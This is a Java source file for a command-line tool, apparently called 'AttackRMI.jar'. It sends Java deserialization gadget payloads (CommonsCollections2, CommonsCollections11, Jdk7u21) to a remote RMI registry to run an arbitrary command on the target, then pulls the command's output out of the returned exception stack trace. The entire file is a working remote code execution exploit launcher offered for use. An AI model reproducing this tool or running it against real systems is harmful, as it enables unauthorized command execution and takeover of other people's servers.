import payload.CommonsCollections11;
import payload.PayloadType;
import util.Utils;

import java.io.PrintWriter;
import java.io.StringWriter;
import java.rmi.Remote;
import java.rmi.registry.LocateRegistry;
import java.rmi.registry.Registry;

public class RMIPayload {
    public static void main(String[] args) throws Exception {
        if (args.length != 4) {
            System.err.println("Usage: java -jar AttackRMI.jar [payloadType] [ip] [port] '[command]'");
            System.exit(64);
        }
        final String payloadType = args[0];
        final String remoteIp = args[1];
        final int remotePort = Integer.parseInt(args[2]);
        final String cmd = args[3];

        final Class<? extends PayloadType> payloadClass = Utils.getPayloadClass(payloadType);

        if (payloadClass == null ) {
            System.err.println("Invalid payload type '" + payloadType + "'");
            System.err.println("Available payload types: CommonsCollections2、CommonsCollections11、Jdk7u21");
            System.exit(64);
            return;
        }else if ( "Jdk7u21".equals(payloadType)){
            System.err.println("Unable to obtain echo for Jdk7u21 at the moment");
        }

        PayloadType<Remote> payload = payloadClass.newInstance();
        Remote object = payload.getRemoteObject(cmd);

        Registry registry = LocateRegistry.getRegistry(remoteIp, remotePort);

        try {
            registry.bind("cmd", object);
        } catch (Exception e) {
            StringWriter sw = new StringWriter();
            PrintWriter pw = new PrintWriter(sw);

            // 将错误信息输出到 PrintWriter 对象中
            e.printStackTrace(pw);

            // 将错误堆栈信息转换为字符串
            String stackTrace = sw.toString();
            String indexString = "cmdResult: ";
            int index = stackTrace.indexOf(indexString);
            int end = stackTrace.lastIndexOf("cmdEnd");
            if (end > (index + indexString.length())) {
                String exceptionDetails = stackTrace.substring(index + indexString.length(), end);
                System.out.println(exceptionDetails);
            } else {
                System.out.println("未获取到结果");
            }

        }

    }
}
